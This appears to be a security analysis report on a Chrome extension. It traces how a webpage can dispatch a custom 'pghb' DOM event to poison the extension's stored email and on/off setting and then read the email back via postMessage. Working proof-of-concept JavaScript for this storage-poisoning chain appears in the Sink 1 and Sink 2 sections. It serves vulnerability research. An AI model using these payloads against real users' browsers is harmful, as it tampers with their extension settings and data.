# CoCo Analysis: nnoilpdinmjmdfpkdkbbkajejflbkoma

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 22 (12 storage.set flows + 10 postMessage flows, many duplicates)

---

## Sink 1: document_eventListener_pghb → chrome_storage_sync_set_sink (email)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnoilpdinmjmdfpkdkbbkajejflbkoma/opgen_generated_files/cs_0.js
Line 472: document.addEventListener("pghb", function(ev)
Line 474: if(ev.detail && ev.detail.action && ev.detail.action === 'configtest-prepared')
Line 478: if(ev.detail && ev.detail.detail && ev.detail.detail.action && ev.detail.detail.action === 'configtest-result')
Line 492: chrome.runtime.sendMessage({action:'set-ext-email', 'email': ev.detail.detail.email })

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnoilpdinmjmdfpkdkbbkajejflbkoma/opgen_generated_files/bg.js
Line 1021: chrome.storage.sync.set({'userEmail':message.email}, function() {})

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
document.addEventListener("pghb", function(ev) { // ← attacker can dispatch custom event
  // console.log('PGAI-EXT: got a phb event from document', ev.detail, ev.detail.detail, ev.detail.action);
  if(ev.detail && ev.detail.action && ev.detail.action === 'configtest-prepared'){
    return;
  }
  if(ev.detail && ev.detail.detail && ev.detail.detail.action && ev.detail.detail.action === 'configtest-result'){
    chrome.runtime.sendMessage(ev.detail.detail); // ← attacker-controlled
    chrome.runtime.sendMessage({action:'get-ext-email'});
    return;
  }

  if(ev.detail && ev.detail.detail.action && ev.detail.detail.action === 'set-ext-email'){
    chrome.runtime.sendMessage({action:'set-ext-email', 'email': ev.detail.detail.email }); // ← attacker-controlled email
    return;
  }
  if(ev.detail && ev.detail.detail.action && ev.detail.detail.action === 'delete-ext-email'){
    chrome.runtime.sendMessage({action:'delete-ext-email'});
    return;
  }
  if(ev.detail && ev.detail.detail.action && ev.detail.detail.action === 'turn-ext-off'){
    chrome.runtime.sendMessage({action:'set-ext-status', 'value': ev.detail.detail.value}); // ← attacker-controlled value
    return;
  }
});

// Background script - Message handler (bg.js)
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  // set extension status
  if(message && message.action && message.action === 'set-ext-email'){
    chrome.storage.sync.set({'userEmail':message.email}, function() { // ← attacker-controlled email stored
      // console.log('PGAI-EXT-BACKGROUND: Settings saved', message);
    });
  }

  if(message && message.action && message.action === 'set-ext-status'){
    extensionStatus = message.value; // ← attacker-controlled value stored
    chrome.storage.sync.set({'isExtEnabled':message.value}, function() {
      // console.log('PGAI-EXT-BACKGROUND: Settings for extension status saved', message);
    });
    updateTabResult(lastTabId);
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener

**Attack:**

```javascript
// From any webpage where the content script runs (all URLs per manifest)
// Attacker can dispatch custom "pghb" event to poison storage

// Poison email
document.dispatchEvent(new CustomEvent('pghb', {
  detail: {
    detail: {
      action: 'set-ext-email',
      email: 'attacker@evil.com'
    }
  }
}));

// Disable extension
document.dispatchEvent(new CustomEvent('pghb', {
  detail: {
    detail: {
      action: 'turn-ext-off',
      value: false
    }
  }
}));
```

**Impact:** This is part of a complete storage exploitation chain. The attacker can poison the userEmail and isExtEnabled values in storage, which are then retrieved and sent back to the webpage via postMessage (see Sink 2).

---

## Sink 2: storage_sync_get_source → window_postMessage_sink (email retrieval)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnoilpdinmjmdfpkdkbbkajejflbkoma/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = {'key': 'value'}
Line 1015: chrome.tabs.sendMessage(sender.tab.id, {message: 'email-from-ext',value: items['userEmail']})

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  // get extension status
  if(message && message.action && message.action === 'get-ext-email'){
    chrome.storage.sync.get(['userEmail'], function(items) {
      // console.log('PGAI-EXT-BACKGROUND: Settings retrieved', items);
      chrome.tabs.sendMessage(sender.tab.id, {message: 'email-from-ext',value: items['userEmail']}); // ← previously poisoned email sent back
    });
  }
});

// Content script - Message handler (cs_0.js)
chrome.runtime.onMessage.addListener( function(request, sender) {
  // console.log('PGAI-EXT: got message from Extenstion', request.message);
  if (request && request.message && request.message === 'email-from-ext') {
    // console.log('PGAI-EXT: sending email from ext to configtest', request);
    window.postMessage({ type: "pghb", command: "set-email-from-ext", "email": request.value }, "*"); // ← poisoned email sent to webpage
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event with complete storage exploitation chain

**Attack:**

```javascript
// Complete exploitation chain:

// Step 1: Poison storage
document.dispatchEvent(new CustomEvent('pghb', {
  detail: {
    detail: {
      action: 'set-ext-email',
      email: 'attacker@evil.com'
    }
  }
}));

// Step 2: Listen for the poisoned data being sent back
window.addEventListener('message', function(event) {
  if (event.data.type === 'pghb' && event.data.command === 'set-email-from-ext') {
    console.log('Retrieved poisoned email:', event.data.email); // 'attacker@evil.com'
  }
});

// Step 3: Trigger retrieval by sending message to request email
document.dispatchEvent(new CustomEvent('pghb', {
  detail: {
    detail: {
      action: 'configtest-result' // This triggers get-ext-email
    }
  }
}));
```

**Impact:** Complete storage exploitation chain. Attacker can write arbitrary email value to storage and retrieve it back via postMessage, enabling full control over the stored email configuration. This could allow the attacker to manipulate extension behavior that depends on the stored email, potentially impersonating users or altering extension functionality.

---

## Note on Duplicate Detections

CoCo detected the same flows multiple times across cs_0.js and cs_1.js (which appear to be duplicate content scripts), and across different execution paths. The vulnerability pattern is the same:

1. **Storage Write Flows** (6 unique patterns, detected 12 times):
   - `ev.detail.detail.email` → storage.sync.set (userEmail)
   - `ev.detail.detail.value` → storage.sync.set (isExtEnabled)

2. **Storage Read Flows** (1 unique pattern, detected 10 times):
   - storage.sync.get (userEmail) → window.postMessage

All flows follow the same exploitation pattern: attacker dispatches custom DOM event → data sent to background via runtime.sendMessage → stored in storage.sync → retrieved and sent back to content script → postMessage to webpage where attacker can access it.

**All detections are TRUE POSITIVE** as they represent complete storage exploitation chains with attacker-controlled data flowing from DOM events through storage and back to the attacker via postMessage.
